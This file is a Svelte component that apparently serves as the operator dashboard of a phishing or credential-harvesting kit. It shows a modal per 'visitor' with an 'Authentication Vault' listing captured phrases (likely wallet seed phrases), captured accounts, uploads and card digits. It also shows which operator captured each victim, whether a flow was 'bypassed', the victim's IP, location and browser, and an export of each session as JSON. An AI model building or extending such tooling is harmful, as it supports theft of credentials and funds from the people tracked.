<script lang="ts">
	import {
		X,
		Download,
		Lock,
		Unlock,
		User,
		MapPin,
		Activity,
		Monitor,
		Bug,
		Copy,
		Check,
		Mail,
		Globe2,
		Hash,
		Clock,
		ChevronRight,
		FileText,
		Package,
		UserRound
	} from 'lucide-svelte';
	import type { Visitor } from '$lib/server/state';
	import { sendMessage } from '$lib/stores/websocket';
	import { timeAgo } from '$lib/utils/time';
	import { toast } from '$lib/stores/toast';

	interface Props {
		visitor: Visitor;
		onclose: () => void;
	}

	let { visitor, onclose }: Props = $props();

	let unlocked = $state(false);
	let copiedField = $state<string | null>(null);

	function copyToClipboard(text: string, field: string) {
		navigator.clipboard?.writeText(text);
		copiedField = field;
		toast.success(`${field.charAt(0).toUpperCase() + field.slice(1)} copied to clipboard`);
		setTimeout(() => (copiedField = null), 1500);
	}

	function exportSession() {
		sendMessage('visitor:export', { ip: visitor.ip });
		const blob = new Blob([JSON.stringify(visitor, null, 2)], { type: 'application/json' });
		const url = URL.createObjectURL(blob);
		const a = document.createElement('a');
		a.href = url;
		a.download = `session-${visitor.ip.replace(/[:.]/g, '-')}.json`;
		document.body.appendChild(a);
		a.click();
		document.body.removeChild(a);
		setTimeout(() => URL.revokeObjectURL(url), 1000);
	}

	function shortId(id: string): string {
		if (!id) return '—';
		if (id.length <= 12) return id;
		return id.slice(0, 8) + '...' + id.slice(-4);
	}

	function formatDateTime(ts: number): string {
		if (!ts) return '—';
		try {
			return new Date(ts).toLocaleString();
		} catch {
			return String(ts);
		}
	}

	let activeUntil = $derived(visitor.status === 'online' ? 'now' : timeAgo(visitor.connectedAt));
</script>

<div
	class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm"
	onclick={onclose}
	role="dialog"
	aria-modal="true"
	aria-label="Session details"
>
	<div
		class="w-full max-w-2xl max-h-[90vh] overflow-y-auto rounded-xl border border-[var(--border)] bg-[var(--card)] p-0 shadow-2xl custom-scrollbar"
		onclick={(e) => e.stopPropagation()}
		role="document"
	>
		<!-- Header -->
		<div class="flex items-start justify-between border-b border-[var(--border)] px-6 py-5 bg-gradient-to-br from-[var(--accent-primary)]/8 to-transparent">
			<div class="flex items-center gap-3">
				<div class="flex h-10 w-10 items-center justify-center rounded-full bg-[var(--accent-primary)]/15 text-lg">
					{visitor.flag || '👤'}
				</div>
				<div class="min-w-0">
					<div class="flex items-center gap-2">
						<h3 class="text-base font-semibold text-[var(--foreground)]">
							{visitor.email || 'Anonymous'}
						</h3>
						<span class="rounded-md border border-[var(--border)] bg-[var(--accent)]/30 px-2 py-0.5 text-[10px] font-medium text-[var(--muted-foreground)] capitalize">
							{visitor.status}
						</span>
					</div>
					<p class="mt-0.5 font-mono text-[11px] text-[var(--text-tertiary)]">
						{shortId(visitor.userId)}
					</p>
				</div>
			</div>
			<div class="flex items-center gap-2">
				<button
					onclick={exportSession}
					class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
					title="Export this session as JSON"
				>
					<Download size={12} />
					Export
				</button>
				<button
					onclick={onclose}
					class="rounded-lg p-1.5 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
					aria-label="Close"
				>
					<X size={16} />
				</button>
			</div>
		</div>

		<div class="space-y-4 p-6">
			<!-- Authentication Vault -->
			<div class="rounded-lg border border-[var(--border)] bg-[var(--input)]/30">
				<div class="flex items-center justify-between px-4 py-3 border-b border-[var(--border-subtle)]">
					<div class="flex items-center gap-2">
						{#if unlocked}
							<Unlock size={14} class="text-[var(--status-live)]" />
						{:else}
							<Lock size={14} class="text-[var(--text-accent)]" />
						{/if}
						<p class="text-sm font-semibold text-[var(--foreground)]">Authentication Vault</p>
						<span class="rounded-md bg-amber-500/15 px-2 py-0.5 text-[10px] font-medium text-amber-400">Sensitive</span>
					</div>
					<button
						onclick={() => (unlocked = !unlocked)}
						class="flex items-center gap-1 rounded-lg border border-[var(--border)] px-2.5 py-1 text-[11px] text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
					>
						{#if unlocked}
							<Lock size={11} />
							Lock
						{:else}
							<Unlock size={11} />
							Unlock
						{/if}
					</button>
				</div>
				{#if unlocked}
					<div class="grid grid-cols-2 gap-3 p-4">
						<div>
							<p class="text-[10px] font-medium uppercase tracking-wider text-[var(--text-tertiary)]">Phrases captured</p>
							<p class="mt-1 text-sm font-mono font-semibold text-[var(--foreground)]">{visitor.phrases}</p>
						</div>
						<div>
							<p class="text-[10px] font-medium uppercase tracking-wider text-[var(--text-tertiary)]">Accounts captured</p>
							<p class="mt-1 text-sm font-mono font-semibold text-[var(--foreground)]">{visitor.accounts}</p>
						</div>
						<div>
							<p class="text-[10px] font-medium uppercase tracking-wider text-[var(--text-tertiary)]">Uploads</p>
							<p class="mt-1 text-sm font-mono font-semibold text-[var(--foreground)]">{visitor.uploads}</p>
						</div>
						<div>
							<p class="text-[10px] font-medium uppercase tracking-wider text-[var(--text-tertiary)]">Last 2 digits</p>
							<p class="mt-1 text-sm font-mono font-semibold text-[var(--foreground)]">{visitor.lastTwoDigits || '—'}</p>
						</div>
					</div>
				{:else}
					<p class="px-4 py-4 text-xs text-[var(--muted-foreground)]">
						Vault is locked. Click Unlock to reveal sensitive captured data.
					</p>
				{/if}
			</div>

			<!-- 3-column info grid -->
			<div class="grid gap-3 md:grid-cols-3">
				<!-- Identity -->
				<div class="rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4">
					<div class="mb-3 flex items-center gap-2">
						<User size={13} class="text-[var(--text-accent)]" />
						<p class="text-xs font-semibold text-[var(--foreground)]">Identity</p>
					</div>
					<dl class="space-y-2 text-[11px]">
						<div class="flex items-center justify-between gap-2">
							<dt class="text-[var(--muted-foreground)]">Email</dt>
							<dd class="truncate text-[var(--foreground)]">{visitor.email || '—'}</dd>
						</div>
						<div class="flex items-center justify-between gap-2">
							<dt class="text-[var(--muted-foreground)]">Module</dt>
							<dd class="text-[var(--foreground)]">{visitor.module || '—'}</dd>
						</div>
						<div class="flex items-center justify-between gap-2">
							<dt class="text-[var(--muted-foreground)]">By User</dt>
							<dd class="font-mono text-[var(--foreground)]">{visitor.capturedBy || '—'}</dd>
						</div>
					</dl>
				</div>

				<!-- Location -->
				<div class="rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4">
					<div class="mb-3 flex items-center gap-2">
						<MapPin size={13} class="text-[var(--text-accent)]" />
						<p class="text-xs font-semibold text-[var(--foreground)]">Location</p>
					</div>
					<dl class="space-y-2 text-[11px]">
						<div class="flex items-center justify-between gap-2">
							<dt class="text-[var(--muted-foreground)]">IP</dt>
							<dd class="truncate font-mono text-[var(--foreground)]">{visitor.ip}</dd>
						</div>
						<div class="flex items-center justify-between gap-2">
							<dt class="text-[var(--muted-foreground)]">Country</dt>
							<dd class="text-[var(--foreground)]">{visitor.country || '—'}</dd>
						</div>
						<div class="flex items-center justify-between gap-2">
							<dt class="text-[var(--muted-foreground)]">City</dt>
							<dd class="truncate text-[var(--foreground)]">{visitor.city || '—'}{visitor.region ? `, ${visitor.region}` : ''}</dd>
						</div>
					</dl>
				</div>

				<!-- Activity -->
				<div class="rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4">
					<div class="mb-3 flex items-center gap-2">
						<Activity size={13} class="text-[var(--text-accent)]" />
						<p class="text-xs font-semibold text-[var(--foreground)]">Activity</p>
					</div>
					<dl class="space-y-2 text-[11px]">
						<div class="flex items-center justify-between gap-2">
							<dt class="text-[var(--muted-foreground)]">Last Page</dt>
							<dd class="truncate font-mono text-[var(--foreground)]">{visitor.lastPageRoute || visitor.lastPage || '—'}</dd>
						</div>
						<div class="flex items-center justify-between gap-2">
							<dt class="text-[var(--muted-foreground)]">Active</dt>
							<dd class="text-[var(--foreground)]">{activeUntil}</dd>
						</div>
						<div class="flex items-center justify-between gap-2">
							<dt class="text-[var(--muted-foreground)]">Entry</dt>
							<dd class="truncate text-[var(--foreground)]" title={formatDateTime(visitor.connectedAt)}>{formatDateTime(visitor.connectedAt)}</dd>
						</div>
					</dl>
				</div>
			</div>

			<!-- User Agent -->
			<div class="rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4">
				<div class="mb-3 flex items-center justify-between">
					<div class="flex items-center gap-2">
						<Monitor size={13} class="text-[var(--text-accent)]" />
						<p class="text-xs font-semibold text-[var(--foreground)]">User Agent</p>
					</div>
					{#if visitor.userAgent}
						<button
							onclick={() => copyToClipboard(visitor.userAgent, 'ua')}
							class="rounded-md p-1 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
							aria-label="Copy user agent"
						>
							{#if copiedField === 'ua'}
								<Check size={12} class="text-[var(--status-live)]" />
							{:else}
								<Copy size={12} />
							{/if}
						</button>
					{/if}
				</div>
				<p class="font-mono text-[11px] leading-relaxed text-[var(--foreground)] break-all">
					{visitor.userAgent || visitor.device || 'Unknown'}
				</p>
			</div>

			<!-- Debug -->
			<div class="rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-4">
				<div class="mb-3 flex items-center justify-between">
					<div class="flex items-center gap-2">
						<Bug size={13} class="text-[var(--text-accent)]" />
						<p class="text-xs font-semibold text-[var(--foreground)]">Debug</p>
					</div>
				</div>
				<div class="grid grid-cols-2 gap-3 text-[11px]">
					<div class="flex items-center gap-2">
						<FileText size={11} class="text-[var(--text-accent)]" />
						<span class="text-[var(--muted-foreground)]">Phrases:</span>
						<span class="font-mono text-[var(--foreground)]">{visitor.phrases}</span>
					</div>
					<div class="flex items-center gap-2">
						<UserRound size={11} class="text-[var(--text-accent)]" />
						<span class="text-[var(--muted-foreground)]">Accounts:</span>
						<span class="font-mono text-[var(--foreground)]">{visitor.accounts}</span>
					</div>
					<div class="flex items-center gap-2">
						<Package size={11} class="text-[var(--text-accent)]" />
						<span class="text-[var(--muted-foreground)]">Uploads:</span>
						<span class="font-mono text-[var(--foreground)]">{visitor.uploads}</span>
					</div>
					<div class="flex items-center gap-2">
						<Hash size={11} class="text-[var(--text-accent)]" />
						<span class="text-[var(--muted-foreground)]">Flow:</span>
						<span class="font-mono text-[var(--foreground)]">{visitor.flow || '—'}</span>
					</div>
					<div class="flex items-center gap-2">
						<ChevronRight size={11} class="text-[var(--text-accent)]" />
						<span class="text-[var(--muted-foreground)]">Bypassed:</span>
						<span class="font-mono text-[var(--foreground)]">{visitor.flowBypassed ? 'Yes' : 'No'}</span>
					</div>
					<div class="flex items-center gap-2">
						<Globe2 size={11} class="text-[var(--text-accent)]" />
						<span class="text-[var(--muted-foreground)]">Browser:</span>
						<span class="font-mono text-[var(--foreground)]">{visitor.browser || visitor.device || '—'}</span>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
